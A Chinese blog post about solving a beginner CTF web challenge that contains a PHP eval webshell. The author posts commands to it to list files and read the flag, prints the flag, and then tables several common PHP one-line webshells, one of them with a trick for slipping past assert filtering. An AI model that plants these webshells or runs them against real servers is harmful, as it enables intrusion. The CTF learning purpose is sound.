---
layout: post
title: Web新手题-webshell
excerpt: "攻防世界新手Web题目-webshell"
date:   2020-10-10 17:00:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 题目描述“小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。”
2. 访问网页，显示“你会使用webshell吗？\<?php @eval($_POST['shell']);?\>"
3. 所以应该是网站上已经有一个一句话马了，使用POST方法传递shell参数，交给eval执行
4. 使用Burp Suite截包之后，将请求方式修改为POST，在请求体中添加字段shell

   * *shell=echo system("ls");* 查看当前路径下的文件,发现共flag.txt、index.php两个文件

   * *shell=echo system("cat flag.txt");* 查看flag.txt文件内容
5. 发现flag，cyberpeace{73c3fd8c2f076cbdac7f4db709589703}
6. 提交答案，正确 

## 独立思考

### 1. PHP有哪些常用的一句话马？

| 代码                                            | 操作数  | 注意                                                         |
| ----------------------------------------------- | ------- | ------------------------------------------------------------ |
| eval(@\$_GET("cmd"))                            | PHP代码 | 需要以分号结尾                                               |
| assert(@\$_POST['cmd']);                        | PHP代码 | 本来是用来测试操作数中的PHP语句执行有没有出错                |
| $fun = create_function('',$_POST['a']); $fun(); |         | create_function()把用户传入的数据生成一个function，再执行这个function |
| @call_user_func(assert,$_POST['a']);            |         | 通过call_user_func()绕过系统对assert的拦截，将它的第二个参数作为它的第一个参数的参数进行执行 |
| ......                                          |         |                                                              |



## 产生过的疑问

1. PHP有哪些常用的一句话马？
